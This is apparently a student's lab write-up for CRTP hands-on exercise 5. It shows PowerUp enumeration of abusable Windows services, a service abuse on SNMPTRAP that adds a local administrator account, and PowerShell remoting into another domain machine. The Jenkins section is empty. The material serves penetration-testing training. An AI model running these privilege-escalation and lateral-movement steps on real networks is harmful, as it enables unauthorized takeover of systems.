CRTP: Hands-On 5

```
  • Exploit a service on dcorp-studentx and elevate privileges to local administrator.
  • Identify a machine in the domain where studentx has local administrative access.
  • Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
```

Index:

  1. [Exploit Local Service](#exploit-local-service)
  2. [Machine with Local Admin Privs](#machine-with-local-admin-privs)
  3. [Exploit Jenkins](#exploit-jenkins)


## Exploit Local Service

Detect vulnerable service:
```
PS C:\Users\student162> Import-Module C:\AD\Tools\PowerUp.ps1
PS C:\Users\student162> Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.


[*] Checking for unquoted service paths...


ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True

ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True





[*] Checking service executable and argument permissions...


ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiableFile                  : C:\WebServer\Abyss Web Server
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True

ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiableFile                  : C:\WebServer\Abyss Web Server
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True

ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiableFile                  : C:\WebServer\Abyss Web Server
ModifiableFilePermissions       : WriteData/AddFile
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True

ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False

ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : WriteData/AddFile
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : WriteData/AddFile
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False





[*] Checking service permissions...


ServiceName   : AbyssWebServer
Path          : C:\WebServer\Abyss Web Server\abyssws.exe -service
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart    : True

ServiceName   : SNMPTRAP
Path          : C:\Windows\System32\snmptrap.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'
CanRestart    : True





[*] Checking %PATH% for potentially hijackable DLL locations...


ModifiablePath    : C:\Users\student162\AppData\Local\Microsoft\WindowsApps
IdentityReference : dcorp\student162
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\student162\AppData\Local\Microsoft\WindowsApps
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\student162\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'





[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


[*] Checking for modifidable registry autoruns and configs...


[*] Checking for modifiable schtask files/configs...


[*] Checking for unattended install files...


[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


[*] Checking for plaintext passwords in McAfee SiteList.xml files....




[*] Checking for cached Group Policy Preferences .xml files....

```
Abuse of local service:
```
 Invoke-ServiceAbuse -Name 'SNMPTRAP'
WARNING: Waiting for service 'SNMP Trap (SNMPTRAP)' to stop...

ServiceAbused Command
------------- -------
SNMPTRAP      net user john Password123! /add && net localgroup Administrators john /add
```

## Machine with Local Admin Privs

Detect machine with local admin access and authenticate as student user of dcorp domain:
```
PS C:\Users\student162> Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Users\student162> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
PS C:\Users\student162> Enter-PSSession -ComputerName dcorp-adminsrv
[dcorp-adminsrv]: PS C:\Users\student162\Documents> whoami
dcorp\student162
[dcorp-adminsrv]: PS C:\Users\student162\Documents> hostname
dcorp-adminsrv
[dcorp-adminsrv]: PS C:\Users\student162\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::7f0c:9f91:b123:91a0%6
   IPv4 Address. . . . . . . . . . . : 172.16.4.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.4.254
```

## Exploit Jenkins

```
```
